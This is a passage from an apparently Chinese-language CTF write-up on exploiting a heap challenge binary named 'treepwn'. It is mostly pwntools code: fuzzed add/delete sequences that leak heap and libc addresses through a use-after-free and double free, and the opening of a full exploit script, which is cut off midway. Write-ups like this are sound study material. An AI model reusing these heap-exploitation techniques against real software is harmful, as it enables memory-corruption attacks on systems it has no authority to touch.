class="title">test</span>():</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">30</span>))</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">40</span>))</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">50</span>))</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">60</span>))</span><br><span class="line">    dele(<span class="number">7</span>,<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">70</span>))</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">80</span>))</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">90</span>))</span><br><span class="line">    dele(<span class="number">5</span>,<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line">    dele(<span class="number">1</span>,<span class="number">5</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">110</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">120</span>))</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">130</span>))</span><br><span class="line">    dele(<span class="number">3</span>,<span class="number">5</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">140</span>))</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">150</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">160</span>))</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">170</span>))</span><br><span class="line">    dele(<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">180</span>))</span><br><span class="line">    dele(<span class="number">6</span>,<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">190</span>))</span><br><span class="line">    dele(<span class="number">1</span>,<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">200</span>))</span><br><span class="line">    dele(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">210</span>))</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">220</span>))</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">230</span>))</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">240</span>))</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">4</span>,<span class="built_in">str</span>(<span class="number">250</span>))</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">260</span>))</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">270</span>))</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">280</span>))</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">290</span>))</span><br><span class="line">    dele(<span class="number">1</span>,<span class="number">4</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">300</span>))</span><br><span class="line">    dele(<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">310</span>))</span><br><span class="line">    dele(<span class="number">5</span>,<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">320</span>))</span><br><span class="line">    dele(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">    dele(<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">330</span>))</span><br><span class="line">    dele(<span class="number">7</span>,<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">4</span>,<span class="built_in">str</span>(<span class="number">340</span>))</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">350</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">4</span>,<span class="built_in">str</span>(<span class="number">360</span>))</span><br><span class="line">    dele(<span class="number">0</span>,<span class="number">4</span>)</span><br><span class="line">    dele(<span class="number">5</span>,<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">370</span>))</span><br><span class="line">    dele(<span class="number">6</span>,<span class="number">8</span>)</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">380</span>))</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">390</span>))</span><br><span class="line">    dele(<span class="number">4</span>,<span class="number">4</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">400</span>))</span><br><span class="line">    dele(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">410</span>))</span><br><span class="line">    dele(<span class="number">7</span>,<span class="number">8</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">420</span>))</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">430</span>))</span><br><span class="line">    dele(<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">    dele(<span class="number">7</span>,<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">440</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">450</span>))</span><br><span class="line">    dele(<span class="number">1</span>,<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">460</span>))</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">470</span>))</span><br><span class="line">    dele(<span class="number">1</span>,<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">480</span>))</span><br><span class="line">    dele(<span class="number">7</span>,<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">490</span>))</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">4</span>,<span class="built_in">str</span>(<span class="number">500</span>))</span><br><span class="line">    dele(<span class="number">5</span>,<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">510</span>))</span><br><span class="line">    dele(<span class="number">3</span>,<span class="number">6</span>)</span><br><span class="line">    dele(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">520</span>))</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">530</span>))</span><br><span class="line">    dele(<span class="number">5</span>,<span class="number">4</span>)</span><br><span class="line">    dele(<span class="number">6</span>,<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">4</span>,<span class="built_in">str</span>(<span class="number">540</span>))</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">550</span>))</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">560</span>))</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">570</span>))</span><br><span class="line">    dele(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">580</span>))</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">590</span>))</span><br><span class="line">    dele(<span class="number">8</span>,<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">600</span>))</span><br><span class="line">    dele(<span class="number">4</span>,<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">610</span>))</span><br><span class="line">    dele(<span class="number">1</span>,<span class="number">7</span>)</span><br><span class="line">    dele(<span class="number">6</span>,<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">620</span>))</span><br><span class="line">    dele(<span class="number">5</span>,<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">630</span>))</span><br><span class="line">    dele(<span class="number">6</span>,<span class="number">5</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">640</span>))</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">650</span>))</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">660</span>))</span><br><span class="line">    dele(<span class="number">6</span>,<span class="number">8</span>)</span><br><span class="line">    <span class="comment">#dele(8,0)</span></span><br><span class="line">    <span class="comment">#add(4,2,str(670))</span></span><br><span class="line">    <span class="comment">#dele(2,2)</span></span><br><span class="line">    <span class="comment">#add(4,3,str(680))</span></span><br><span class="line">    <span class="comment">#dele(0,1)</span></span><br><span class="line">    <span class="comment">#dele(3,6)</span></span><br><span class="line">    <span class="comment">#add(4,5,str(690))</span></span><br><span class="line">    <span class="comment">#dele(4,8)</span></span><br><span class="line">    <span class="comment">#dele(4,3)</span></span><br><span class="line">    <span class="comment">#add(1,2,str(700))</span></span><br><span class="line">    <span class="comment">#dele(6,8) </span></span><br><span class="line"></span><br><span class="line">test()</span><br><span class="line">show(<span class="number">6</span>,<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;found!!! its name: &quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = leak_addr-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<p>用同样的方法，在原来的基础上再次进行 fuzz，得到恶意 payload 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">5</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">dele(<span class="number">4</span>,<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line">dele(<span class="number">7</span>,<span class="number">4</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line">dele(<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">30</span>))</span><br><span class="line">dele(<span class="number">6</span>,<span class="number">7</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">40</span>))</span><br><span class="line">dele(<span class="number">8</span>,<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">6</span>,<span class="number">7</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">4</span>,<span class="built_in">str</span>(<span class="number">50</span>))</span><br><span class="line">dele(<span class="number">4</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">60</span>))</span><br><span class="line">dele(<span class="number">7</span>,<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">70</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">80</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">90</span>))</span><br><span class="line">dele(<span class="number">5</span>,<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">8</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">110</span>))</span><br><span class="line">dele(<span class="number">6</span>,<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">120</span>))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">130</span>))</span><br><span class="line">dele(<span class="number">3</span>,<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">140</span>))</span><br><span class="line">dele(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">4</span>,<span class="built_in">str</span>(<span class="number">150</span>))</span><br><span class="line">dele(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">160</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">170</span>))</span><br><span class="line">dele(<span class="number">6</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">180</span>))</span><br><span class="line">dele(<span class="number">1</span>,<span class="number">5</span>) <span class="comment"># target</span></span><br><span class="line">dele(<span class="number">1</span>,<span class="number">5</span>) <span class="comment"># target</span></span><br></pre></td></tr></table></figure>
<ul>
<li>利用这个 UAF 可以 leak libc_base</li>
</ul>
<p>想要完成利用还差一次 fuzz（用于进行 tcache UAF），但是程序对 add 的次数进行了限制，我们可以先删减前两个 payload 中的 add 再进行 fuzz</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./treepwn&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./treepwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">x,y,name</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;new element x-coordinate value: &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;new element y-coordinate value: &quot;</span>,<span class="built_in">str</span>(y))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;new element name: &quot;</span>,name.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;want element x-coordinate value: &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;want element y-coordinate value: &quot;</span>,<span class="built_in">str</span>(y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>(<span class="params">a,b,c,d</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;value: &quot;</span>,<span class="built_in">str</span>(a))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;value: &quot;</span>,<span class="built_in">str</span>(b))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;value: &quot;</span>,<span class="built_in">str</span>(c))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;value: &quot;</span>,<span class="built_in">str</span>(d))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;want element x-coordinate value: &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;want element y-coordinate value: &quot;</span>,<span class="built_in">str</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">x,y,name</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;want element x-coordinate value: &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;want element y-coordinate value: &quot;</span>,<span class="built_in">str</span>(y))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input the edited name: &quot;</span>,name.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzz</span>():</span></span><br><span class="line">    f=<span class="built_in">open</span>(<span class="string">&#x27;./log.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>):</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">10</span>==<span class="number">0</span>):</span><br><span class="line">            a = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            b = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            add(a,b,<span class="built_in">str</span>(i))</span><br><span class="line">            data0=p.recvuntil(<span class="string">&#x27;Choice Table&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;two many&#x27;</span> <span class="keyword">in</span> data0:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            f.write(<span class="string">&#x27;add(&#123;&#125;,&#123;&#125;,str(&#123;&#125;))\n&#x27;</span>.<span class="built_in">format</span>(a,b,i))</span><br><span class="line">            success(<span class="string">&#x27;add(&#123;&#125;,&#123;&#125;,str(&#123;&#125;))\n&#x27;</span>.<span class="built_in">format</span>(a,b,i))</span><br><span class="line">        <span class="keyword">elif</span>(i%<span class="number">2</span>==<span class="number">0</span>):</span><br><span class="line">            a = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            b = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            dele(a,b)</span><br><span class="line">            data0=p.recvline()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;not exists&#x27;</span> <span class="keyword">in</span> data0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            f.write(<span class="string">&#x27;dele(&#123;&#125;,&#123;&#125;)\n&#x27;</span>.<span class="built_in">format</span>(a,b))</span><br><span class="line">            success(<span class="string">&#x27;dele(&#123;&#125;,&#123;&#125;)\n&#x27;</span>.<span class="built_in">format</span>(a,b))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            a = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            b = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            c = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            d = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            query(a,b,c,d)</span><br><span class="line">            data0=p.recvuntil(<span class="string">&#x27;Choice Table&#x27;</span>)</span><br><span class="line">            <span 